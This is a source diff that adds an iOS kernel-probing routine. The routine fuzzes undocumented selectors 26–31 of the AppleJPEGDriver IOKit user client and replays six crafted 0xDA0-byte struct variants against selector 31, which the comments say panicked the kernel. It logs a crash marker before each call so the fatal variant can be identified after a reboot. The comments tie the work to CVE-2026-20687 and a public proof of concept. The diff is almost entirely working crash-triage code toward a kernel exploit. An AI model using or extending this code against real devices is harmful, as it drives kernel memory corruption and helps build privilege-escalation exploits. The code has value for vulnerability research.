@@ -880,6 +880,150 @@ NSString *ModJpegLastPanic(void) {
     return @"no marker yet: run 20687 selectors first, then reboot and run this";
 }
 
+// Focused probe of the NEW selector the panic came from: sel=31 shape=3 (the
+// 0xDA0 struct).  The public PoC only documented sel0-sel10 and the kext's
+// dispatchers bound at 25, so sel26-31 is entirely uncharted.
+//   Phase A (safe): sel26..31 with scalar-only, 0x58 and 0x1000, dumping every
+//                   successful output.
+//   Phase B: sel31 with a 0xDA0 struct in several variants, each recorded in the
+//            panic marker BEFORE the call, so one run shows which variant dies.
+NSString *ModJpegSel31(void) {
+    AveLog(@"[sel31] === focused probe: sel26..31 + the 0xDA0 variants that panicked ===");
+    io_service_t svc = rs_jpeg_service();
+    if (!svc) return @"AppleJPEGDriver: service not found";
+
+    io_connect_t conn = 0;
+    kern_return_t kr = IOServiceOpen(svc, mach_task_self(), 0, &conn);
+    if (kr != KERN_SUCCESS || !conn) { IOObjectRelease(svc); return @"userclient not openable"; }
+
+    mach_port_t notify = MACH_PORT_NULL;
+    if (mach_port_allocate(mach_task_self(), MACH_PORT_RIGHT_RECEIVE, &notify) == KERN_SUCCESS)
+        mach_port_insert_right(mach_task_self(), notify, notify, MACH_MSG_TYPE_MAKE_SEND);
+    IOConnectSetNotificationPort(conn, 0, notify, 0);
+
+    const uint32_t W = 2048, H = 2048;
+    UIGraphicsBeginImageContext(CGSizeMake(W, H));
+    [[UIColor redColor] setFill];
+    UIRectFill(CGRectMake(0, 0, W, H));
+    UIImage *img = UIGraphicsGetImageFromCurrentImageContext();
+    UIGraphicsEndImageContext();
+    NSData *jpeg = UIImageJPEGRepresentation(img, 0.9);
+    size_t allocLen = jpeg ? ((jpeg.length + 0x3FFF) & ~(size_t)0x3FFF) : 0x1000;
+    NSDictionary *sp = @{(id)kIOSurfaceWidth: @(allocLen), (id)kIOSurfaceHeight: @1,
+                         (id)kIOSurfaceBytesPerElement: @1, (id)kIOSurfacePixelFormat: @0x20202020};
+    IOSurfaceRef_ src = IOSurfaceCreate((__bridge CFDictionaryRef)sp);
+    NSDictionary *dp = @{(id)kIOSurfaceWidth: @(W), (id)kIOSurfaceHeight: @(H),
+                         (id)kIOSurfaceBytesPerElement: @4, (id)kIOSurfacePixelFormat: @0x42475241};
+    IOSurfaceRef_ dst = IOSurfaceCreate((__bridge CFDictionaryRef)dp);
+    if (!jpeg || !src || !dst) {
+        if (src) CFRelease(src);
+        if (dst) CFRelease(dst);
+        IOServiceClose(conn); IOObjectRelease(svc);
+        return @"surface/jpeg setup failed";
+    }
+    IOSurfaceLock(src, 0, NULL);
+    memcpy(IOSurfaceGetBaseAddress(src), jpeg.bytes, jpeg.length);
+    IOSurfaceUnlock(src, 0, NULL);
+    uint32_t srcID = IOSurfaceGetID(src), dstID = IOSurfaceGetID(dst);
+    AveLog(S(@"[sel31] src=%u dst=%u jpeg=%zuB", srcID, dstID, jpeg.length));
+
+    // ---- Phase A: sel26..31, the three shapes that did NOT panic ----
+    AveLog(@"[sel31] --- phase A: sel26..31, scalar / 0x58 / 0x1000 ---");
+    for (uint32_t sel = 26; sel <= 31; sel++) {
+        uint64_t sc[6] = {1, 2, 3, 4, 5, 6};
+        uint64_t oc64[8];
+        uint32_t oc = 8;
+        memset(oc64, 0, sizeof oc64);
+        rs_jm_markSel(sel, 0);
+        kern_return_t kA = IOConnectCallMethod(conn, sel, sc, 6, NULL, 0, oc64, &oc, NULL, NULL);
+        AveLog(S(@"sel%-2u scalar   kr=%#x outCnt=%u", sel, kA, oc));
+
+        RSJpegIn b1;
+        RSJpegIn b2;
+        memset(&b1, 0, sizeof b1);
+        memset(&b2, 0, sizeof b2);
+        rs_jm_fill(&b1, srcID, dstID, W, H, 0, 0x6161);
+        size_t osz = sizeof b2;
+        rs_jm_markSel(sel, 1);
+        kern_return_t kB = IOConnectCallStructMethod(conn, sel, &b1, sizeof b1, &b2, &osz);
+        AveLog(S(@"sel%-2u 0x58     kr=%#x outSize=%zu", sel, kB, osz));
+        if (kB == KERN_SUCCESS && osz > 0)
+            rs_jm_dump(S(@"sel%u 0x58 out", sel), (const uint8_t *)&b2, osz);
+
+        uint8_t *c1 = (uint8_t *)malloc(0x1000);
+        uint8_t *c2 = (uint8_t *)malloc(0x1000);
+        if (c1 && c2) {
+            memset(c1, 0, 0x1000);
+            memset(c2, 0, 0x1000);
+            rs_jm_fill((RSJpegIn *)c1, srcID, dstID, W, H, 0, 0x6161);
+            osz = 0x1000;
+            rs_jm_markSel(sel, 2);
+            kern_return_t kC = IOConnectCallStructMethod(conn, sel, c1, 0x1000, c2, &osz);
+            AveLog(S(@"sel%-2u 0x1000   kr=%#x outSize=%zu", sel, kC, osz));
+            if (kC == KERN_SUCCESS && osz > 0)
+                rs_jm_dump(S(@"sel%u 0x1000 out", sel), c2, osz);
+        }
+        free(c1);
+        free(c2);
+        rs_jm_drain(notify, S(@"sel%u", sel));
+    }
+    AveLog(@"[sel31] --- phase A done (no panic) ---");
+
+    // ---- Phase B: sel31 with a 0xDA0 struct, one variant at a time ----
+    // Each variant is recorded in the marker before the call, so after a panic
+    // and reboot the marker names the variant that died.
+    AveLog(@"[sel31] --- phase B: sel31 0xDA0 variants ---");
+    for (int v = 0; v < 6; v++) {
+        uint8_t *d1 = (uint8_t *)malloc(0xDA0);
+        uint8_t *d2 = (uint8_t *)malloc(0xDA0);
+        if (!d1 || !d2) { free(d1); free(d2); break; }
+        memset(d1, 0, 0xDA0);
+        memset(d2, 0, 0xDA0);
+        switch (v) {
+            case 0:   // completely zero - no header at all
+                AveLog(@"[sel31] variant 0: all-zero 0xDA0 (no header)");
+                break;
+            case 1:   // the sweep's shape: valid header + zeros  (KNOWN PANIC)
+                rs_jm_fill((RSJpegIn *)d1, srcID, dstID, W, H, 0, 0x6161);
+                AveLog(@"[sel31] variant 1: valid 0x58 header, asyncToken=0x6161 (the known panic)");
+                break;
+            case 2:   // same but asyncToken = 0 (sync)
+                rs_jm_fill((RSJpegIn *)d1, srcID, dstID, W, H, 0, 0);
+                AveLog(@"[sel31] variant 2: valid header, asyncToken=0 (sync)");
+                break;
+            case 3:   // same but flags = 1
+                rs_jm_fill((RSJpegIn *)d1, srcID, dstID, W, H, 1, 0x6161);
+                AveLog(@"[sel31] variant 3: valid header, flags=1");
+                break;
+            case 4:   // 64x64 header - tiny surfaces
+                rs_jm_fill((RSJpegIn *)d1, srcID, dstID, 64, 64, 0, 0x6161);
+                AveLog(@"[sel31] variant 4: 64x64 header");
+                break;
+            case 5:   // header at offset 0x58 instead of 0
+                rs_jm_fill((RSJpegIn *)(d1 + 0x58), srcID, dstID, W, H, 0, 0x6161);
+                AveLog(@"[sel31] variant 5: header at +0x58");
+                break;
+            default:
+                break;
+        }
+        size_t osz = 0xDA0;
+        rs_jm_markSel(31, 100 + v);
+        kern_return_t kD = IOConnectCallStructMethod(conn, 31, d1, 0xDA0, d2, &osz);
+        AveLog(S(@"[sel31] variant %d 0xDA0 -> kr=%#x outSize=%zu", v, kD, osz));
+        if (kD == KERN_SUCCESS && osz > 0)
+            rs_jm_dump(S(@"sel31 var%d out", v), d2, osz);
+        free(d1);
+        free(d2);
+        rs_jm_drain(notify, S(@"sel31 var%d", v));
+    }
+
+    IOServiceClose(conn);
+    CFRelease(src); CFRelease(dst);
+    IOObjectRelease(svc);
+    AveSetStatus(@"sel31 probe done - see the log");
+    return @"sel31 probe done: phase A (sel26..31, three shapes) + phase B (six 0xDA0 variants)";
+}
+
 NSString *ModJpegMethods(void) {
     AveLog(@"[jpegmethods] === CVE-2026-20687 selector audit (hidgate-poc jpegmethods2 port) ===");
     io_service_t svc = rs_jpeg_service();
